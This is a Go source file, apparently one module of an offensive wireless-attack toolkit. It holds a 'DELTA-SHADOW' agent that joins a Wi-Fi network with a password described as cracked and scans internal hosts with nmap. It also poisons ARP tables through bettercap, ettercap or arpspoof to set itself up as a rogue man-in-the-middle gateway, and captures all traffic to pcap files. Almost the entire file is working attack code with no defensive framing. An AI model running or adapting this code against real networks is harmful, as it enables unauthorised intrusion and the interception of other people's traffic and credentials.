// DELTA-SHADOW Agent
// Auto-Pivoting, Internal Recon, Rogue Gateway Poisoning, Packet Sniffing

package etherbreach

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// DeltaShadow handles post-exploitation and internal recon
type DeltaShadow struct {
	bus     *EventBus
	state   *SharedState
	stopCh  chan struct{}
	status  string
}

// NewDeltaShadow creates the shadow agent
func NewDeltaShadow() *DeltaShadow {
	return &DeltaShadow{
		stopCh: make(chan struct{}),
		status: "idle",
	}
}

func (d *DeltaShadow) Name() string   { return "DELTA" }
func (d *DeltaShadow) Status() string { return d.status }

func (d *DeltaShadow) Start(bus *EventBus, state *SharedState) {
	d.bus = bus
	d.state = state
	ch := bus.Subscribe(d.Name())

	for {
		select {
		case msg := <-ch:
			d.handleMessage(msg)
		case <-d.stopCh:
			return
		}
	}
}

func (d *DeltaShadow) Stop() {
	close(d.stopCh)
}

func (d *DeltaShadow) handleMessage(msg AgentMessage) {
	switch msg.Type {
	case "PIVOT_CONNECT":
		if msg.Target != nil && msg.Payload != nil {
			d.status = "pivoting"
			ssid := msg.Target.SSID
			pass := ""
			if p, ok := msg.Payload["password"].(string); ok {
				pass = p
			}
			d.connectAndPivot(ssid, pass, msg.Target)
			d.status = "idle"
		}
	case "INTERNAL_RECON":
		d.status = "recon"
		d.runInternalRecon()
		d.status = "idle"
	case "ROGUE_GATEWAY":
		d.status = "gateway"
		d.startRogueGateway()
		d.status = "idle"
	case "SNIFF_START":
		d.status = "sniffing"
		d.startSniffing()
	case "SNIFF_STOP":
		d.stopSniffing()
		d.status = "idle"
	}
}

// connectAndPivot connects to cracked network and starts internal recon
func (d *DeltaShadow) connectAndPivot(ssid, password string, target *NetworkTarget) {
	d.broadcast(fmt.Sprintf("[PIVOT] Connecting to %s...", ssid))
	iface := d.state.Adapter

	// Create wpa_supplicant config
	wpaConf := filepath.Join("/tmp/nexus-void", "wpa_supplicant.conf")
	conf := fmt.Sprintf(`network={
	ssid="%s"
	psk="%s"
	key_mgmt=WPA-PSK
}`, ssid, password)
	os.WriteFile(wpaConf, []byte(conf), 0600)

	// Connect
	cmd := exec.Command("sudo", "wpa_supplicant", "-B", "-i", iface, "-c", wpaConf)
	out, err := cmd.CombinedOutput()
	if err != nil {
		d.broadcast(fmt.Sprintf("[!] wpa_supplicant failed: %v\n%s", err, string(out)))
		return
	}

	d.broadcast("[PIVOT] wpa_supplicant started. Waiting for DHCP...")
	time.Sleep(5 * time.Second)

	// Get IP via DHCP
	dhcpCmd := exec.Command("sudo", "dhclient", iface)
	dhcpCmd.Run()
	time.Sleep(3 * time.Second)

	// Check connection
	if out, err := exec.Command("ip", "addr", "show", iface).CombinedOutput(); err == nil {
		if strings.Contains(string(out), "inet ") {
			d.broadcast(fmt.Sprintf("[PIVOT] Connected! IP assigned: %s", string(out)))
			d.state.mu.Lock()
			d.state.Connected = true
			d.state.mu.Unlock()
		}
	}

	// Now start internal recon
	d.runInternalRecon()
}

// runInternalRecon does nmap host discovery + service scan on internal network
func (d *DeltaShadow) runInternalRecon() {
	d.broadcast("[RECON] Starting internal network reconnaissance...")

	// Find our network range
	var subnet string
	if out, err := exec.Command("ip", "route").CombinedOutput(); err == nil {
		lines := strings.Split(string(out), "\n")
		for _, line := range lines {
			if strings.Contains(line, "default") && strings.Contains(line, "src") {
				// Extract subnet
				parts := strings.Fields(line)
				for i, p := range parts {
					if p == "src" && i+1 < len(parts) {
						ip := parts[i+1]
						// Convert to /24 subnet
						ipParts := strings.Split(ip, ".")
						if len(ipParts) == 4 {
							subnet = fmt.Sprintf("%s.%s.%s.0/24", ipParts[0], ipParts[1], ipParts[2])
						}
					}
				}
			}
		}
	}

	if subnet == "" {
		subnet = "192.168.1.0/24" // Fallback
	}

	d.broadcast(fmt.Sprintf("[RECON] Scanning subnet: %s", subnet))

	// Host discovery
	if _, err := exec.LookPath("nmap"); err == nil {
		d.broadcast("[RECON] Running nmap host discovery...")
		cmd := exec.Command("sudo", "nmap", "-sn", subnet)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()

		// Service scan on alive hosts
		d.broadcast("[RECON] Running service scan on discovered hosts...")
		cmd = exec.Command("sudo", "nmap", "-sV", "-O", "--top-ports", "100", subnet)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
	} else {
		d.broadcast("[!] nmap not installed. Using ping sweep...")
		d.pingSweep(subnet)
	}

	d.broadcast("[RECON] Internal reconnaissance complete.")
}

// pingSweep is the fallback internal discovery
func (d *DeltaShadow) pingSweep(subnet string) {
	base := strings.TrimSuffix(subnet, "/24")
	base = strings.TrimSuffix(base, ".0")

	for i := 1; i <= 254; i++ {
		ip := fmt.Sprintf("%s.%d", base, i)
		exec.Command("ping", "-c", "1", "-W", "1", ip).Run()
	}
}

// startRogueGateway enables ARP spoofing and DNS hijacking
func (d *DeltaShadow) startRogueGateway() {
	d.broadcast("[GATEWAY] Starting rogue gateway poisoning...")
	iface := d.state.Adapter

	// Enable IP forwarding
	exec.Command("sudo", "sysctl", "-w", "net.ipv4.ip_forward=1").Run()

	// Method 1: Bettercap (modern, preferred)
	if _, err := exec.LookPath("bettercap"); err == nil {
		d.broadcast("[GATEWAY] Using bettercap for full MITM...")
		cmd := exec.Command("sudo", "bettercap",
			"-iface", iface,
			"-eval", "set arp.spoof.fullduplex true; set arp.spoof.targets 192.168.1.0/24; arp.spoof on; net.sniff on")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
		return
	}

	// Method 2: Ettercap
	if _, err := exec.LookPath("ettercap"); err == nil {
		d.broadcast("[GATEWAY] Using ettercap for ARP poisoning...")
		cmd := exec.Command("sudo", "ettercap", "-T", "-M", "arp:remote",
			"//192.168.1.1//", "//192.168.1.0/24//",
			"-i", iface)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
		return
	}

	// Method 3: arpspoof
	if _, err := exec.LookPath("arpspoof"); err == nil {
		d.broadcast("[GATEWAY] Using arpspoof + dnsspoof...")
		// Get gateway
		gateway := d.findGateway()
		if gateway != "" {
			cmd := exec.Command("sudo", "arpspoof", "-i", iface, gateway)
			cmd.Start()
		}
		return
	}

	d.broadcast("[!] No ARP spoofing tools found. Install: bettercap or ettercap")
}

// findGateway extracts default gateway IP
func (d *DeltaShadow) findGateway() string {
	if out, err := exec.Command("ip", "route", "show", "default").CombinedOutput(); err == nil {
		parts := strings.Fields(string(out))
		for i, p := range parts {
			if p == "via" && i+1 < len(parts) {
				return parts[i+1]
			}
		}
	}
	return ""
}

// startSniffing begins packet capture
func (d *DeltaShadow) startSniffing() {
	d.broadcast("[SNIFF] Starting packet capture...")
	iface := d.state.Adapter
	capFile := filepath.Join("/tmp/nexus-void", fmt.Sprintf("capture_%d.pcap", time.Now().Unix()))

	// Use tcpdump
	if _, err := exec.LookPath("tcpdump"); err == nil {
		cmd := exec.Command("sudo", "tcpdump",
			"-i", iface,
			"-w", capFile,
			"-s", "0")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
	} else if _, err := exec.LookPath("tshark"); err == nil {
		cmd := exec.Command("sudo", "tshark", "-i", iface, "-w", capFile)
		cmd.Run()
	}

	d.broadcast(fmt.Sprintf("[SNIFF] Capture saved: %s", capFile))
}

func (d *DeltaShadow) stopSniffing() {
	d.broadcast("[SNIFF] Stopping capture...")
	exec.Command("sudo", "killall", "tcpdump").Run()
	exec.Command("sudo", "killall", "tshark").Run()
}

func (d *DeltaShadow) broadcast(msg string) {
	d.bus.Broadcast(AgentMessage{
		From: d.Name(), To: "ALL", Type: "LOG", Data: msg,
	})
}
